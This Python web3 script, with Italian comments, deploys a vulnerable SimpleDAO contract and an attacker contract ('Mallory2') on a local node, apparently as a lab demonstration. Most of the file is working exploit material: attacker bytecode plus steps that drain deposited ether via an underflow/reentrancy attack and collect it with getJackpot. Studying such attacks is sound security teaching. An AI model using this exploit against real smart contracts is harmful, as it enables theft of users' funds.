from web3 import Web3
import json

web3 = Web3(Web3.HTTPProvider('http://node:8545'))
if (web3.isConnected()):
    print("Connessione con il nodo riuscita" + "\n")
else:
    print("Connessione con il nodo fallita" + "\n")

simpleDAOInterface = [
	{
		"constant": False,
		"inputs": [
			{
				"name": "to",
				"type": "address"
			}
		],
		"name": "donate",
		"outputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "withdraw",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "to",
				"type": "address"
			}
		],
		"name": "queryCredit",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"name": "credit",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	}
]
simpleDAOInterfaceJS = json.dumps(simpleDAOInterface) 

mallory2Interface = [
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "dao",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [],
		"name": "getJackpot",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [],
		"name": "attack",
		"outputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "performAttack",
		"outputs": [
			{
				"name": "",
				"type": "bool"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"name": "addr",
				"type": "address"
			}
		],
		"payable": True,
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
mallory2InterfaceJS = json.dumps(mallory2Interface) 

simpleDAOBytecode = "6060604052341561000f57600080fd5b61034b8061001e6000396000f30060606040526004361061006c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062362a951461007157806312065fe01461009f5780632e1a7d4d146100c857806359f1286d146100eb578063d5d44d8014610138575b600080fd5b61009d600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610185565b005b34156100aa57600080fd5b6100b26101d4565b6040518082815260200191505060405180910390f35b34156100d357600080fd5b6100e960048080359060200190919050506101f3565b005b34156100f657600080fd5b610122600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506102bf565b6040518082815260200191505060405180910390f35b341561014357600080fd5b61016f600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610307565b6040518082815260200191505060405180910390f35b346000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015156102bb573373ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185876187965a03f1925050509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600060205280600052604060002060009150905054815600a165627a7a72305820bc2ca3f23362192ff58a9fce1aefc64d1d2d5f98870d6cd62f88d1958a306e0e0029"
mallory2Bytecode = "606060405260018060146101000a81548160ff02191690831515021790555060405160208061063c8339810160405280805190602001909190505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610571806100cb6000396000f30060606040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe0146101445780634162169f1461016d5780639329066c146101c25780639e5faafc146101d7578063baf755cb146101e1575b600160149054906101000a900460ff1615610142576000600160146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561012d57600080fd5b6102c65a03f1151561013e57600080fd5b5050505b005b341561014f57600080fd5b61015761020e565b6040518082815260200191505060405180910390f35b341561017857600080fd5b61018061022d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156101cd57600080fd5b6101d5610252565b005b6101df6103bc565b005b34156101ec57600080fd5b6101f4610532565b604051808215151515815260200191505060405180910390f35b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561031b57600080fd5b6102c65a03f1151561032c57600080fd5b505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050905060018060146101000a81548160ff02191690831515021790555050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a956001306040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b151561047757600080fd5b6125ee5a03f1151561048857600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561051c57600080fd5b6102c65a03f1151561052d57600080fd5b505050565b600160149054906101000a900460ff16815600a165627a7a723058208741343d3be98b947fb66d7e15b549651bb1e31c46f360185886f2d0bdddcfb20029"

accounts = web3.eth.accounts
# Set dell'account con il quale farò i deploy
web3.eth.defaultAccount = web3.eth.accounts[0]

# Definisco un oggetto contratto simpleDAO a partire dall'interfaccia e dal bytecode
simpleDAOContract = web3.eth.contract(abi=simpleDAOInterfaceJS, bytecode=simpleDAOBytecode)
# Costruisco la transazione per fare il deploy del contratto simpleDAO
contract_data = simpleDAOContract.constructor().buildTransaction({'from': accounts[0]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_simpleDAO = web3.eth.contract(address=txn_receipt.contractAddress, abi=simpleDAOInterfaceJS)
# Address, balance e functions di SimpleDAO
print("L'account[0] ha pubblicato il contratto SimpleDAO: " + str((contract_simpleDAO.address)) 
+ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_simpleDAO.address)) + "\ned offre le seguenti funzioni:" + "\n"
+ str(contract_simpleDAO.all_functions()) + "\n")

# Alice deposita 1 ether nel contratto simpleDAO investendo su un account
contract_simpleDAO.functions.donate(accounts[2]).transact({'from': accounts[1], 'value': 1000000000000000000})
# Bilancio del contratto simpleDAO
print("Alice investe 1 ether su un account (account[2]) mettendolo in SimpleDAO, il cui bilancio diventa: " 
+ str(web3.eth.getBalance(contract_simpleDAO.address)) + "\n")

# Bob deposita 1 ether nel contratto simpleDAO investendo su un account
contract_simpleDAO.functions.donate(accounts[4]).transact({'from': accounts[3], 'value': 1000000000000000000})
# Bilancio del contratto simpleDAO
print("Bob investe 1 ether su un account (account[4]) mettendolo in SimpleDAO, il cui bilancio diventa: " 
+ str(web3.eth.getBalance(contract_simpleDAO.address)) + "\n")

# Definisco un oggetto contratto mallory2 a partire dall'interfaccia e dal bytecode
mallory2Contract = web3.eth.contract(abi=mallory2InterfaceJS, bytecode=mallory2Bytecode)
# Costruisco la transazione per fare il deploy del contratto mallory2
contract_data = mallory2Contract.constructor(contract_simpleDAO.address).buildTransaction({'value': 1, 'from': accounts[5]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_mallory2 = web3.eth.contract(address=txn_receipt.contractAddress, abi=mallory2InterfaceJS)
# Address, balance e functions di mallory2
print("Cindy(accounts[5]) pubblica il contratto Mallory2: " + str((contract_mallory2.address)) 
+ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_mallory2.address)) + "\ned offre le seguenti funzioni:" + "\n"
+ str(contract_mallory2.all_functions()) + "\n")

# Cindy attacca investe su contratto mallory2
contract_mallory2.functions.attack().transact({'from': accounts[5]})
print(".........Cindy ha inviato l'attacco underflow:.........\n")

print("Bilancio del contratto simpleDAO dopo l'attacco di Cindy: " + str(web3.eth.getBalance(contract_simpleDAO.address)) + "\n")

print("Bilancio del contratto Mallory in simpleDAO dopo l'attacco di Cindy: " + str(contract_simpleDAO.functions.queryCredit(contract_mallory2.address).call()) + "\n")

print("Bilancio del contratto Mallory2 dopo l'attacco di Cindy: " + str(web3.eth.getBalance(contract_mallory2.address)) + "\n")

print("Bilancio dell'account che ha creato il contratto mallory2 prima di chiamare getJackpot: " +
str(web3.eth.getBalance(accounts[5])) + "\n")

contract_mallory2.functions.getJackpot().transact({'from': accounts[5]})

print("Bilancio dell'account dopo getJackpot: " + str(web3.eth.getBalance(accounts[5])) + "\n")
